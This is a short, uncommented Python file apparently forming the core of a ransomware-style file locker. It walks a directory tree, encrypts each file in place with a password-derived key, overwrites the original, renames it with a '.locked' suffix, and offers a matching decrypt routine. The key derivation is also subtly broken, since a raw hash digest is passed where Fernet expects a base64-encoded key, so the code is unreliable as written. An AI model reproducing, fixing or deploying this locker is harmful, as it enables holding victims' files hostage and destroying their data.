import os
import hashlib
from cryptography.fernet import Fernet

def generate_key(password):
    return Fernet(hashlib.sha256(password.encode()).digest())

def encrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        encrypted = key.encrypt(data)
        with open(file_path, 'wb') as f:
            f.write(encrypted)
        os.rename(file_path, file_path + '.locked')
        return True
    except:
        return False

def decrypt_file(file_path, key):
    try:
        if not file_path.endswith('.locked'):
            return False
        with open(file_path, 'rb') as f:
            data = f.read()
        decrypted = key.decrypt(data)
        with open(file_path.replace('.locked', ''), 'wb') as f:
            f.write(decrypted)
        os.remove(file_path)
        return True
    except:
        return False

def get_all_files(target_dir):
    all_files = []
    for root, _, files in os.walk(target_dir):
        for file in files:
            all_files.append(os.path.join(root, file))
    return all_files
